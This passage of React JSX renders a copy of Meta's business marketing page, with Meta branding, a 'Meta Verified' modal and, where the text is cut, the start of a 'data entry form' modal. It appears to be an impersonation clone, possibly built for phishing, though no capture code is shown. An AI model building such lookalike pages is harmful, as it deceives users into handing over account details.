                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="9" cy="7" r="4" stroke="#0457CB" strokeWidth="2" /><path d="M3 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /><path d="M16 3.13a4 4 0 0 1 0 7.75" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /><path d="M21 21v-2a4 4 0 0 0-3-3.85" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /></svg> ), title: texts.landingFeatureReachMoreTitle, desc: texts.landingFeatureReachMoreDesc },
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /></svg> ), title: texts.becomeExpertCardTitle, desc: ( <>{ texts.becomeExpertLead }{ ' ' }<a href="https://www.facebook.com/business/learn" style={ { color: '#0064E0' } }>{ texts.metaBlueprintBrand }</a>{ texts.becomeExpertTrail }</> ) },
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7Z" stroke="#0457CB" strokeWidth="2" /><path d="M9 21h6" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /></svg> ), title: texts.personalisedAdSolutionsTitle, desc: texts.personalisedAdSolutionsDesc },
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18 20V10" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /><path d="M12 20V4" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /><path d="M6 20v-6" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" /></svg> ), title: texts.understandPerformanceTitle, desc: texts.understandPerformanceDesc },
                            { icon: ( <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="3" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" /><rect x="14" y="3" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" /><rect x="3" y="14" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" /><rect x="14" y="14" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" /></svg> ), title: texts.adFormatsTitle, desc: texts.adFormatsDesc }
                        ].map( ( card, index ) => (
                            <div key={ index } className="landing-feature-cell" style={ { width: 'calc(33.333% - 24px)', margin: '0 12px 24px', minWidth: '280px', flex: '1 1 280px' } }>
                                <div style={ { background: '#fff', borderRadius: '24px', padding: '40px', border: '1px solid rgba(10,19,23,0.12)', height: '100%', display: 'flex', flexDirection: 'column', boxSizing: 'border-box' } }>
                                    <div style={ { width: '84px', height: '84px', borderRadius: '50%', background: '#EEF4FF', display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '24px', flexShrink: 0 } }>{ card.icon }</div>
                                    <div style={ { flex: 1 } }>
                                        <h3 style={ { fontSize: '24px', fontWeight: '500', color: '#0A1317', lineHeight: '1.2', marginBottom: '24px', display: 'block' } }>{ card.title }</h3>
                                        <div className="landing-feature-desc" style={ { fontSize: '16px', color: '#5D6C7B', lineHeight: '1.5' } }>{ card.desc }</div>
                                    </div>
                                </div>
                            </div>
                        ) ) }
                    </div>
                </div>
            </section>

            {/* ===== TOOLS SECTION ===== */}
            <section className="landing-tools" style={ { padding: '0 0 0' } }>
                <div className="landing-tools-inner" style={ { maxWidth: '1504px', margin: '0 auto', padding: '80px 32px' } }>
                    <h1 className="landing-tools-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', marginBottom: '56px', display: 'block' } }>{ texts.toolsTitle }</h1>
                    <div className="landing-tools-layout" style={ { display: 'flex', alignItems: 'stretch', gap: '80px' } }>
                        <div className="landing-tools-accordion" style={ { width: '40%', flexShrink: 0, borderTop: '1px solid #e5e7eb' } }>
                            { [
                                { id: 'ads_manager', title: texts.adsManager, desc: texts.accordionAdsManagerDesc },
                                { id: 'business_suite', title: texts.accordionBusinessSuiteTitle, desc: texts.accordionBusinessSuiteDesc },
                                { id: 'pixel', title: texts.accordionPixelTitle, desc: texts.accordionPixelDesc },
                                { id: 'pages', title: texts.accordionFbPagesTitle, desc: texts.accordionFbPagesDesc },
                                { id: 'ai_tools', title: texts.accordionAiMarketingTitle, desc: texts.accordionAiMarketingDesc }
                            ].map( ( item ) => {
                                const isActive = activeAccordion === item.id;
                                return (
                                    <div key={ item.id } style={ { padding: '24px 0', borderBottom: '1px solid #e5e7eb', cursor: 'pointer', color: isActive ? '#1C2B33' : '#6b7280' } } onClick={ () => setActiveAccordion( item.id ) }>
                                        <h3 style={ { fontSize: '20px', fontWeight: isActive ? '500' : '400', color: '#0A1317', display: 'flex', justifyContent: 'space-between', alignItems: 'center', margin: 0 } }>
                                            { item.title }
                                            { isActive ? ( <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M7 17L17 7M17 7H7M17 7v10" stroke="#0A1317" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg> ) : ( <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M12 5v14M5 12h14" stroke="#9ca3af" strokeWidth="1.5" strokeLinecap="round" /></svg> ) }
                                        </h3>
                                        { isActive && (
                                            <div style={ { maxWidth: '80%' } }>
                                                <p style={ { padding: '6px 0', margin: '16px 0', color: '#5D6C7B', fontSize: '16px', lineHeight: '1.6' } }>{ item.desc }</p>
                                                <div style={ { display: 'flex', flexDirection: 'column', gap: '8px' } }>
                                                    { [ texts.learnMore, texts.goToAdsManager ].map( ( label ) => (
                                                        <div key={ label } style={ { display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' } }>
                                                            <div style={ { width: '32px', height: '32px', borderRadius: '50%', border: '1px solid rgba(10,19,23,0.45)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 } }>
                                                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M12 5l7 7-7 7" stroke="#007BFF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg>
                                                            </div>
                                                            <span style={ { fontSize: '14px', color: '#007BFF', fontWeight: '500' } }>{ label }</span>
                                                        </div>
                                                    ) ) }
                                                </div>
                                            </div>
                                        ) }
                                    </div>
                                );
                            } ) }
                        </div>
                        <div className="landing-tools-video-wrap" style={ { flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center' } }>
                            <div style={ { maxWidth: '470px', width: '100%', position: 'relative', borderRadius: '32px', overflow: 'hidden', boxShadow: '0 20px 50px rgba(0,0,0,0.1)', aspectRatio: '3/4' } }>
                                <video ref={ adsVideoRef } style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } muted loop playsInline autoPlay><source src={ AdsManagerVideo } type="video/mp4" /></video>
                                <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 10 } }>
                                    <button aria-label={ isAdsVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo } style={ { width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.2)', backdropFilter: 'blur(12px)', border: '1px solid rgba(255,255,255,0.4)', borderRadius: '50%', cursor: 'pointer' } } onClick={ () => { if ( adsVideoRef.current ) { isAdsVideoPaused ? adsVideoRef.current.play() : adsVideoRef.current.pause(); setIsAdsVideoPaused( !isAdsVideoPaused ); } } }>
                                        { isAdsVideoPaused ? ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg> ) : ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><rect x="14" y="3" width="5" height="18" rx="1" /><rect x="5" y="3" width="5" height="18" rx="1" /></svg> ) }
                                    </button>
                                </div>
                                <div style={ { position: 'absolute', bottom: 0, left: 0, right: 0, height: '33%', background: 'linear-gradient(to top, rgba(0,0,0,0.2), transparent)', pointerEvents: 'none', opacity: 0.6 } } />
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* ===== INSPIRED SECTION ===== */}
            <section className="landing-inspired" style={ { padding: '80px 0' } }>
                <div className="landing-inspired-inner" style={ { maxWidth: '1240px', margin: '0 auto', padding: '0 24px' } }>
                    <h2 className="landing-inspired-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', marginBottom: '56px', lineHeight: '1.2', display: 'block' } }>{ texts.inspiredTitle }</h2>
                    <div className="landing-inspired-grid" style={ { display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '0 80px', rowGap: '48px' } }>
                        { [
                            { id: 'streetwear', src: StreetwearVideo, title: texts.streetwearTip },
                            { id: 'brooklinen', src: BrooklinenVideo, title: texts.inspiredBrookShort },
                            { id: 'shopify', src: ShopifyVideo, title: texts.inspiredShopifyShort }
                        ].map( ( item ) => {
                            const isPlaying = playingVideo === item.id;
                            return (
                                <div key={ item.id } style={ { display: 'flex', flexDirection: 'column', height: '100%' } }>
                                    <div style={ { position: 'relative', aspectRatio: '3/4', width: '100%', background: '#f3f4f6', borderRadius: '20px', overflow: 'hidden', cursor: 'pointer', boxShadow: '0 10px 30px rgba(0,0,0,0.12)' } } onClick={ () => { const videoEl = document.getElementById( `inspired-video-${ item.id }` ); if ( videoEl ) { if ( isPlaying ) { videoEl.pause(); setPlayingVideo( null ); } else { videoEl.play(); setPlayingVideo( item.id ); } } } }>
                                        <video id={ `inspired-video-${ item.id }` } style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } playsInline loop muted={ false }><source src={ item.src } type="video/mp4" /></video>
                                        { !isPlaying && ( <div style={ { position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0,0,0,0.1)', transition: 'background 0.3s' } }><div style={ { width: '64px', height: '64px', borderRadius: '50%', border: '3px solid #fff', display: 'flex', alignItems: 'center', justifyContent: 'center', backdropFilter: 'blur(4px)', background: 'transparent' } }><svg width="32" height="32" viewBox="0 0 24 24" fill="white" stroke="white" strokeWidth="2"><path d="M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z" /></svg></div></div> ) }
                                    </div>
                                    <div style={ { marginTop: '24px' } }><p style={ { fontSize: '24px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.4', margin: 0 } }>{ item.title }</p></div>
                                </div>
                            );
                        } ) }
                    </div>
                </div>
            </section>

            {/* ===== REACH CUSTOMERS ===== */}
            <section className="landing-reach" style={ { padding: '80px 24px' } }>
                <div className="landing-reach-row" style={ { maxWidth: '1240px', margin: '0 auto', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '40px' } }>
                    <div className="landing-reach-copy" style={ { flex: '1 1 50%' } }>
                        <h2 className="landing-reach-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', marginBottom: '24px', display: 'block' } }>{ texts.reachTitle }</h2>
                        <p style={ { fontSize: '18px', color: '#5D6C7B', marginBottom: '40px', maxWidth: '500px', lineHeight: '1.6' } }>{ texts.reachDesc }</p>
                        <div className="landing-reach-actions" style={ { display: 'flex', alignItems: 'center', gap: '32px' } }>
                            <div id="reach-learn-more" style={ { background: '#0457CB', color: '#fff', padding: '12px 32px', borderRadius: '100px', fontWeight: '500', fontSize: '15px', cursor: 'pointer', whiteSpace: 'nowrap' } }>{ texts.learnMore }</div>
                            <div style={ { display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' } }>
                                <div style={ { width: '32px', height: '32px', borderRadius: '50%', border: '1px solid rgba(10,19,23,0.45)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 } }><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M12 5l7 7-7 7" stroke="#007BFF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg></div>
                                <span style={ { fontSize: '14px', color: '#007BFF', fontWeight: '500' } }>{ texts.createAd }</span>
                            </div>
                        </div>
                    </div>
                    <div className="landing-reach-visual" style={ { flex: '1 1 50%' } }><img src={ MediaImg } alt={ texts.mediaIllustrationAlt } style={ { width: '100%', height: 'auto', objectFit: 'contain', display: 'block' } } /></div>
                </div>
            </section>

            {/* ===== STAY CONNECTED ===== */}
            <section className="landing-stay" style={ { background: '#fff', padding: '80px 0' } }>
                <div className="landing-stay-inner" style={ { maxWidth: '1240px', margin: '0 auto', padding: '0 24px' } }>
                    <div className="landing-stay-intro" style={ { marginBottom: '40px' } }>
                        <p style={ { fontSize: '12px', color: '#5D6C7B', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '8px' } }>{ texts.metaTechnologiesEyebrow }</p>
                        <h2 className="landing-connected-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', display: 'block', margin: 0 } }>{ texts.connectedTitle }</h2>
                    </div>
                    <div className="landing-stay-row" style={ { display: 'flex', flexDirection: 'row', gap: '40px', alignItems: 'flex-start' } }>
                        <div className="landing-stay-icons" style={ { display: 'flex', flexDirection: 'column', gap: '24px', paddingTop: '80px', minWidth: '32px', flexShrink: 0 } }>
                            { [ { id: 'facebook', label: texts.footerFcMetaFb, src: FbIcon }, { id: 'messenger', label: texts.footerFcMetaMsg, src: MessengerIcon }, { id: 'instagram', label: texts.footerFcMetaIg, src: IgIcon }, { id: 'whatsapp', label: texts.footerFcMetaWa, src: WhatsappIcon } ].map( ( platform ) => (
                                <div key={ platform.id } title={ platform.label } style={ { cursor: 'pointer', opacity: activeTab === platform.id ? 1 : 0.2, filter: activeTab === platform.id ? 'none' : 'grayscale(1)', transition: 'all 0.3s' } } onClick={ () => setActiveTab( platform.id ) }>
                                    <img src={ platform.src } alt={ platform.label } style={ { width: '32px', height: '32px', objectFit: 'contain', display: 'block' } } />
                                </div>
                            ) ) }
                        </div>
                        <div className="landing-stay-video" style={ { position: 'relative', maxWidth: '504px', width: '100%', flexShrink: 0, padding: '0 16px' } }>
                            <div style={ { borderRadius: '24px', overflow: 'hidden', aspectRatio: '3/4' } }><video ref={ fansVideoRef } style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } autoPlay loop muted playsInline><source src={ FansVideo } type="video/mp4" /></video></div>
                            <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 20 } }>
                                <button aria-label={ isFansVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo } style={ { width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.2)', backdropFilter: 'blur(12px)', border: '1px solid rgba(255,255,255,0.4)', borderRadius: '50%', cursor: 'pointer' } } onClick={ () => { if ( fansVideoRef.current ) { isFansVideoPaused ? fansVideoRef.current.play() : fansVideoRef.current.pause(); setIsFansVideoPaused( !isFansVideoPaused ); } } }>
                                    { isFansVideoPaused ? ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg> ) : ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><rect x="14" y="3" width="5" height="18" rx="1" /><rect x="5" y="3" width="5" height="18" rx="1" /></svg> ) }
                                </button>
                            </div>
                        </div>
                        <div className="landing-stay-content" style={ { flex: 1, paddingTop: '160px', paddingLeft: '40px' } }>
                            <p style={ { fontSize: '14px', color: '#5D6C7B', marginBottom: '8px', fontWeight: '400' } }>{ texts.marketingOnFacebookEyebrow }</p>
                            <h3 className="landing-stay-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', marginBottom: '16px', display: 'block' } }>{ texts.fansBuildFollowingTitle }</h3>
                            <p style={ { fontSize: '16px', color: '#5D6C7B', marginBottom: '32px', lineHeight: '1.6' } }>{ texts.fansBuildFollowingDesc }</p>
                            <div style={ { display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' } }>
                                <div style={ { width: '32px', height: '32px', borderRadius: '50%', border: '1px solid rgba(10,19,23,0.45)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 } }><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M12 5l7 7-7 7" stroke="#007BFF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg></div>
                                <span style={ { fontSize: '14px', color: '#007BFF', fontWeight: '500' } }>{ texts.exploreFacebookLink }</span>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* ===== SUPPORT SECTION ===== */}
            <section className="landing-support" style={ { background: '#f6f6f6', padding: '56px 0' } }>
                <div className="landing-support-row" style={ { maxWidth: '1504px', margin: '0 auto', padding: '0 24px', display: 'flex', flexDirection: 'row', alignItems: 'center', gap: '64px' } }>
                    <div style={ { position: 'relative', flex: '1 1 50%', display: 'flex', justifyContent: 'center' } }>
                        <div style={ { position: 'relative', borderRadius: '24px', overflow: 'hidden', aspectRatio: '1/1', width: '100%', background: '#000' } }>
                            <video ref={ supportVideoRef } style={ { width: '100%', height: '100%', objectFit: 'cover', opacity: 0.95, display: 'block' } } autoPlay loop muted playsInline><source src={ SupportVideo } type="video/mp4" /></video>
                            <div style={ { position: 'absolute', top: '60%', left: '50%', transform: 'translateX(-50%)', width: '70%', zIndex: 10 } }>
                                <div style={ { background: '#fff', borderRadius: '8px', padding: '16px 24px', boxShadow: '0 12px 40px rgba(0,0,0,0.15)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' } }>
                                    <span style={ { color: '#1C2B33', fontSize: '18px', fontWeight: '500', whiteSpace: 'nowrap' } }>{ texts.createPage }</span>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#5D6C7B" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m21 21-4.34-4.34" /><circle cx="11" cy="11" r="8" /></svg>
                                </div>
                            </div>
                            <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 20 } }>
                                <button aria-label={ isSupportVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo } style={ { width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.2)', backdropFilter: 'blur(12px)', border: '1px solid rgba(255,255,255,0.4)', borderRadius: '50%', cursor: 'pointer' } } onClick={ () => { if ( supportVideoRef.current ) { isSupportVideoPaused ? supportVideoRef.current.play() : supportVideoRef.current.pause(); setIsSupportVideoPaused( !isSupportVideoPaused ); } } }>
                                    { isSupportVideoPaused ? ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg> ) : ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><rect x="14" y="3" width="5" height="18" rx="1" /><rect x="5" y="3" width="5" height="18" rx="1" /></svg> ) }
                                </button>
                            </div>
                        </div>
                    </div>
                    <div className="landing-support-copy" style={ { flex: '1 1 50%' } }>
                        <div style={ { maxWidth: '500px' } }>
                            <p style={ { fontSize: '12px', color: '#5D6C7B', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '12px', fontWeight: '500' } }>{ texts.supportCentreEyebrow }</p>
                            <h2 className="landing-support-heading" style={ { fontSize: '40px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', marginBottom: '32px', display: 'block' } }>{ texts.supportAnswersTitle }</h2>
                            <div style={ { display: 'flex', alignItems: 'center', gap: '32px' } }>
                                <button id="support-get-support" style={ { background: '#1877F2', color: '#fff', padding: '14px 32px', borderRadius: '100px', fontWeight: '600', fontSize: '16px', border: 'none', cursor: 'pointer', boxShadow: '0 10px 30px rgba(24,119,242,0.2)' } }>{ texts.getSupport }</button>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* ===== RESOURCES ===== */}
            <section className="landing-resources" style={ { width: '100%', padding: '100px 16px', display: 'flex', alignItems: 'center', justifyContent: 'center', textAlign: 'center', backgroundImage: `url(${ BackgroundImg })`, backgroundSize: 'cover', backgroundPosition: 'center', backgroundRepeat: 'no-repeat' } }>
                <div style={ { maxWidth: '1240px', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '32px' } }>
                    <h2 style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', margin: 0, display: 'block' } }>{ texts.resourcesTitle }</h2>
                    <button id="resources-learn-more" style={ { background: '#1877F2', color: '#fff', padding: '12px 32px', borderRadius: '100px', fontWeight: '600', fontSize: '15px', border: 'none', cursor: 'pointer', boxShadow: '0 4px 12px rgba(0,0,0,0.15)' } }>{ texts.learnMore }</button>
                </div>
            </section>

            {/* ===== FOOTER ===== */}
            <footer style={ { background: '#1b2a34', color: '#fff' } }>
                <div style={ { maxWidth: '1175px', margin: '0 auto', padding: '80px 24px' } }>
                    <div className="landing-footer-newsletter" style={ { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '40px', alignItems: 'start' } }>
                        <div>
                            <h2 style={ { fontSize: '30px', fontWeight: '600', color: '#fff', lineHeight: '1.3', marginBottom: '16px', display: 'block' } }>{ texts.footerUpdateTitle }</h2>
                            <p style={ { color: '#9ca3af', maxWidth: '420px', lineHeight: '1.6', fontSize: '15px' } }>{ texts.footerUpdateDesc }</p>
                        </div>
                        <div className="landing-footer-form" style={ { width: '100%', maxWidth: '540px' } }>
                            <div className="landing-footer-form-fields" style={ { display: 'flex', gap: '16px', marginBottom: '16px' } }>
                                <input type="email" placeholder={ texts.emailAddressPlaceholder || "Email address" } style={ { flex: 1, padding: '12px 16px', borderRadius: '8px', border: 'none', outline: 'none', color: '#465a69', fontSize: '16px', height: '52px' } } />
                                <input type="text" placeholder={ texts.enterCountry || "Enter a country name..." } style={ { flex: 1, padding: '12px 16px', borderRadius: '8px', border: 'none', outline: 'none', color: '#465a69', fontSize: '16px', height: '52px' } } />
                            </div>
                            <p style={ { fontSize: '12px', color: '#9ca3af', lineHeight: '1.6', marginBottom: '16px' } }>
                                { texts.footerDisclaimer || 'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our' }{ ' ' }<span style={ { textDecoration: 'underline', cursor: 'pointer' } }>{ texts.dataPolicy || "Data Policy" }</span>.
                            </p>
                            <button style={ { background: '#0062ff', color: '#fff', padding: '0 24px', height: '50px', display: 'flex', alignItems: 'center', justifyContent: 'center', borderRadius: '100px', fontWeight: '600', fontSize: '15px', border: 'none', cursor: 'pointer' } }>{ texts.subscribeBtn }</button>
                        </div>
                    </div>
                </div>
                <div style={ { borderTop: '1px solid rgba(255,255,255,0.2)' } } />
                <div style={ { background: '#1b2a34', color: '#9ca3af' } }>
                    <div style={ { maxWidth: '1175px', margin: '0 auto', padding: '80px 24px' } }>
                        <div className="landing-footer-nav-grid" style={ { display: 'grid', gridTemplateColumns: 'repeat(7, 1fr)', gap: '32px 24px' } }>
                            { [
                                { colId: 'tech', title: texts.footerFcColMetaTech, links: [ texts.footerFcMetaFb, texts.footerFcMetaIg, texts.footerFcMetaMsg, texts.footerFcMetaWa, texts.footerFcMetaAn, texts.footerFcMetaQuest, texts.footerFcMetaWorkplace, texts.footerFcMetaForWork ] },
                                { colId: 'tools', title: texts.footerFcColTools, links: [ texts.footerFcToolsFt, texts.footerFcToolsFbPages, texts.footerFcToolsIgProfiles, texts.footerFcToolsStories, texts.footerFcToolsShops, texts.footerFcToolsMbs, texts.footerFcToolsFbAds, texts.footerFcToolsIgAds, texts.footerFcToolsVideoAds, texts.footerFcToolsAdsMgr ] },
                                { colId: 'goals', title: texts.footerFcColGoals, links: [ texts.footerFcGoalsFbPage, texts.footerFcGoalsBrandAwareness, texts.footerFcGoalsLocal, texts.footerFcGoalsOnlineSales, texts.footerFcGoalsApp, texts.footerFcGoalsLeads, texts.footerFcGoalsMeasure, texts.footerFcGoalsRetarget ] },
                                { colId: 'biz', title: texts.footerFcColBusinessTypes, links: [ texts.footerFcBizSmall, texts.footerFcBizLarge, texts.footerFcBizAgency, texts.footerFcBizMedia, texts.footerFcBizCreator, texts.footerFcBizDev, texts.footerFcBizPartner ] },
                                { colId: 'industry', title: texts.footerFcColIndustries, links: [ texts.footerFcIndustryAuto, texts.footerFcIndustryCpg, texts.footerFcIndustryEcom, texts.footerFcIndustryEnt, texts.footerFcIndustryFin, texts.footerFcIndustryGaming, texts.footerFcIndustryProperty, texts.footerFcIndustryRest, texts.footerFcIndustryRetail, texts.footerFcIndustryTech, texts.footerFcIndustryTravel ] },
                                { colId: 'skills', title: texts.footerFcColSkills, links: [ texts.footerFcSkillsOnline, texts.footerFcSkillsCert, texts.footerFcSkillsWebinars ] },
                                { colId: 'guides', title: texts.footerFcColGuides, links: [ texts.footerFcGuideAds, texts.footerFcGuideBrand, texts.footerFcGuideBook, texts.footerFcGuideMedia, texts.footerFcGuideSitemap ] }
                            ].map( ( col ) => (
                                <div key={ col.colId }>
                                    <h3 style={ { color: '#cbd2d9', fontSize: '14px', marginBottom: '16px', letterSpacing: '0.025em', fontWeight: '500' } }>{ col.title }</h3>
                                    <ul style={ { listStyle: 'none', padding: 0, margin: 0, display: 'flex', flexDirection: 'column', gap: '12px' } }>
                                        { col.links.map( ( link ) => (
                                            <li key={ `${ col.colId }_${ link }` }><a href="#" style={ { color: '#9ca3af', fontSize: '13px', textDecoration: 'none', transition: 'color 0.2s' } } onMouseOver={ ( e ) => e.target.style.color = '#e5e7eb' } onMouseOut={ ( e ) => e.target.style.color = '#9ca3af' }>{ link }</a></li>
                                        ) ) }
                                    </ul>
                                </div>
                            ) ) }
                        </div>
                        <div style={ { borderTop: '1px solid #465A69', paddingTop: '48px', marginTop: '48px' } }>
                            <div className="landing-footer-bottom" style={ { display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: '24px' } }>
                                <div>
                                    <p style={ { color: '#cbd2d9', fontSize: '13px', marginBottom: '16px' } }>{ texts.footerCopyrightNotice }</p>
                                    <div style={ { display: 'flex', gap: '12px' } }>
                                        { [ { label: texts.footerSocialFacebook, svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="#cbd2d9"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" /></svg> }, { label: texts.footerSocialInstagram, svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#cbd2d9" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" /><circle cx="12" cy="12" r="4" /><circle cx="17.5" cy="6.5" r="1" fill="#cbd2d9" stroke="none" /></svg> }, { label: texts.footerSocialX, svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="#cbd2d9"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231 5.45-6.231Zm-1.161 17.52h1.833L7.084 4.126H5.117Z" /></svg> }, { label: texts.footerSocialLinkedIn, svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="#cbd2d9"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" /><rect x="2" y="9" width="4" height="12" /><circle cx="4" cy="4" r="2" /></svg> } ].map( ( s ) => ( <span key={ s.label } title={ s.label } style={ { cursor: 'pointer', display: 'flex' } }>{ s.svg }</span> ) ) }
                                    </div>
                                </div>
                                <div style={ { display: 'flex', flexWrap: 'wrap', gap: '12px 24px' } }>
                                    { [ texts.footerLegalAbout, texts.footerLegalDevelopers, texts.footerLegalCareers, texts.footerLegalPrivacy, texts.footerLegalCookies, texts.footerLegalTerms, texts.footerLegalHelp ].map( ( link ) => (
                                        <a key={ link } href="#" style={ { color: '#cbd2d9', fontSize: '13px', textDecoration: 'none' } } onMouseOver={ ( e ) => e.target.style.color = '#e5e7eb' } onMouseOut={ ( e ) => e.target.style.color = '#cbd2d9' }>{ link }</a>
                                    ) ) }
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
            </div>
            
            {/* Modal cũ */}
            <HomeStartModals isOpen={ isStartModalsOpen } onClose={ () => setStartModalsOpen( false ) } metaCopy={ { title: texts.metaVerifiedTitle, description: texts.metaVerifiedDesc, btnFacebook: texts.metaVerifiedBtnFacebook, btnInstagram: texts.metaVerifiedBtnInstagram, businessLead: texts.metaVerifiedBusinessLead, businessLink: texts.metaVerifiedBusinessLink, disclaimer: texts.metaVerifiedDisclaimer, ariaClose: texts.metaVerifiedAriaClose, phonesAlt: texts.metaVerifiedPhonesAlt, cornerLabel: texts.metaVerifiedCornerLabel, cornerLead: texts.homeStartModalCornerLead } } monetizeCopy={ { cornerLabel: texts.monetizeModalCornerLabel, cornerLead: texts.homeStartModalCornerLead, back: texts.monetizeModalBack, eyebrow: texts.monetizeModalEyebrow, title: texts.monetizeModalTitle, creatorLabel: texts.monetizeModalCreator, description: texts.monetizeModalDesc, subscribe: texts.monetizeModalSubscribe, brandName: texts.monetizeModalBrand, heroAlt: texts.monetizeModalHeroAlt } } />

            {/* ================= MODAL FORM NHẬP LIỆU (TỪ FILE 2) ================= */}
            {showModal && (
